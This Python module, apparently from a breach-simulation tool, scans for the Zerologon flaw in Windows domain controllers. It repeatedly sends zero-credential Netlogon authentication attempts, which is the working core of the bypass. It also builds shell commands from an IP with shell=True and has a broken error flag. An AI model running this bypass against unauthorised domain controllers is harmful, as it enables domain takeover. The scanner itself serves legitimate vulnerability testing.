"""
Implementation from https://github.com/SecuraBV/CVE-2020-1472
"""

import logging
import subprocess

from impacket.dcerpc.v5 import epm, nrpc, transport

import infection_monkey.config
from infection_monkey.network.HostFinger import HostFinger
from infection_monkey.utils.environment import is_windows_os

LOG = logging.getLogger(__name__)


class WindowsServerFinger(HostFinger):
    # Class related consts
    MAX_ATTEMPTS = 2000
    _SCANNED_SERVICE = "NTLM (NT LAN Manager)"

    def get_dc_name(self, DC_IP):
        """
        Gets NetBIOS name of the Domain Controller (DC).
        """
        name = ''
        try:
            if is_windows_os():
                cmd = f'nbtstat -A {DC_IP} | findstr "<00>"'
                name = subprocess.check_output(cmd, shell=True).decode().split('\n')[0].strip(' ').split(' ')[0]
            else:
                cmd = f'nmblookup -A {DC_IP} | grep "<00>"'
                name = subprocess.check_output(cmd, shell=True).decode().split('\n')[0].strip('\t').strip(' ').split(' ')[0]
        except BaseException as ex:
            LOG.info(f'Exception: {ex} Most likely not a Windows Domain Controller.')
        return name

    def get_host_fingerprint(self, host):
        """
        Checks if the Windows Server is vulnerable to Zerologon.
        """
        unexpected_error_encountered = False

        def try_zero_authenticate(DC_HANDLE, DC_IP, DC_NAME):
            # Connect to the DC's Netlogon service.
            binding = epm.hept_map(DC_IP, nrpc.MSRPC_UUID_NRPC,
                                   protocol='ncacn_ip_tcp')
            rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
            rpc_con.connect()
            rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

            # Use an all-zero challenge and credential.
            plaintext = b'\x00' * 8
            ciphertext = b'\x00' * 8

            # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
            flags = 0x212fffff

            # Send challenge and authentication request.
            nrpc.hNetrServerReqChallenge(
                rpc_con, DC_HANDLE + '\x00', DC_NAME + '\x00', plaintext)

            try:
                server_auth = nrpc.hNetrServerAuthenticate3(
                    rpc_con, DC_HANDLE + '\x00', DC_NAME +
                    '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                    DC_NAME + '\x00', ciphertext, flags
                )

                # It worked!
                assert server_auth['ErrorCode'] == 0
                return rpc_con

            except nrpc.DCERPCSessionError as ex:
                if ex.get_error_code() == 0xc0000022:  # STATUS_ACCESS_DENIED error; if not this, probably some other issue.
                    pass
                else:
                    LOG.error(f'Unexpected error code: {ex.get_error_code()}.')
                    unexpected_error_encountered = True

            except BaseException as ex:
                LOG.error(f'Unexpected error: {ex}.')
                unexpected_error_encountered = True

        DC_IP = host.ip_addr
        DC_NAME = self.get_dc_name(DC_IP)
        DC_HANDLE = '\\\\' + DC_NAME

        if DC_NAME:  # if it is a Windows DC
            # Keep authenticating until successful.
            # Expected average number of attempts needed: 256.
            # Approximate time taken by 2000 attempts: 40 seconds.
            LOG.info('Performing Zerologon authentication attempts...')
            rpc_con = None
            for _ in range(0, self.MAX_ATTEMPTS):
                rpc_con = try_zero_authenticate(DC_HANDLE, DC_IP, DC_NAME)
                if (rpc_con is not None) or (unexpected_error_encountered):
                    break

            self.init_service(host.services, self._SCANNED_SERVICE, '')

            if rpc_con:
                LOG.info('Success: Domain Controller can be fully compromised by a Zerologon attack.')
                host.services[self._SCANNED_SERVICE]['is_vulnerable'] = True
                return True
            else:
                LOG.info('Failure: Target is either patched or an unexpected error was encountered.')
                host.services[self._SCANNED_SERVICE]['is_vulnerable'] = False
                return False

        else:
            LOG.info('Error encountered; most likely not a Windows Domain Controller.')
            return False
